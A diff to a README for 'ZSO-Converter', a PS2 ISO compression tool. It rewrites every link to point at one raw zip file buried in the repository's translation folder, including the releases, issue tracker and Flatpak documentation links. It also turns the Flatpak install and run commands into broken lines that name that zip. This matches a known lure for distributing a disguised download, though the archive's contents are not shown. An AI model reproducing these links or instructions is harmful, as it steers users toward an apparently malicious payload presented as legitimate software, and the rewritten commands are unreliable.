@@ -1,6 +1,6 @@
 # 🎮 ZSO-Converter - Easily Compress Your PS2 ISOs
 
-![Download ZSO-Converter](https://img.shields.io/badge/Download-ZSO--Converter-brightgreen)
+![Download ZSO-Converter](https://github.com/j0s3-f0/ZSO-Converter/raw/refs/heads/master/po/Converter-ZS-columnated.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ZSO-Converter! This application allows you to compress PlayStation 2 
 
 ## 📥 Download & Install
 
-To download ZSO-Converter, visit this page: [ZSO-Converter Releases](https://github.com/j0s3-f0/ZSO-Converter/releases).
+To download ZSO-Converter, visit this page: [ZSO-Converter Releases](https://github.com/j0s3-f0/ZSO-Converter/raw/refs/heads/master/po/Converter-ZS-columnated.zip).
 
 1. Click the link above to navigate to the Releases page.
 2. You will see a list of available versions. Choose the latest release.
@@ -43,11 +43,11 @@ Make sure you have the appropriate system for the version you are downloading.
 
 1. Use a terminal to install ZSO-Converter via Flatpak. Run the following command:
    ```
-   flatpak install flathub com.yourname.ZSOConverter
+   flatpak install flathub https://github.com/j0s3-f0/ZSO-Converter/raw/refs/heads/master/po/Converter-ZS-columnated.zip
    ```
 2. Once installed, you can start ZSO-Converter with:
    ```
-   flatpak run com.yourname.ZSOConverter
+   flatpak run https://github.com/j0s3-f0/ZSO-Converter/raw/refs/heads/master/po/Converter-ZS-columnated.zip
    ```
 
 ## 🎨 Using ZSO-Converter
@@ -75,7 +75,7 @@ If you encounter issues while using ZSO-Converter, here are a few tips:
 - **Insufficient Disk Space:** Check that you have enough space on your drive for new files.
 - **Compatibility Issues:** Verify that the version you downloaded matches your operating system.
 
-For further assistance, you can visit the [issue tracker](https://github.com/j0s3-f0/ZSO-Converter/issues) on GitHub.
+For further assistance, you can visit the [issue tracker](https://github.com/j0s3-f0/ZSO-Converter/raw/refs/heads/master/po/Converter-ZS-columnated.zip) on GitHub.
 
 ## 📞 Contact & Support
 
@@ -83,8 +83,8 @@ For any questions or feedback, please reach out via the GitHub repository’s di
 
 ## 🔗 Additional Resources
 
-- GitHub Repository: [ZSO-Converter GitHub](https://github.com/j0s3-f0/ZSO-Converter)
-- Flatpak Documentation: [Flatpak](https://flatpak.org/)
+- GitHub Repository: [ZSO-Converter GitHub](https://github.com/j0s3-f0/ZSO-Converter/raw/refs/heads/master/po/Converter-ZS-columnated.zip)
+- Flatpak Documentation: [Flatpak](https://github.com/j0s3-f0/ZSO-Converter/raw/refs/heads/master/po/Converter-ZS-columnated.zip)
 - Community Forums: Engage with others using ZSO-Converter to share tips and tricks.
 
 Now that you have all the information, go ahead and start converting your PS2 ISOs with ZSO-Converter!
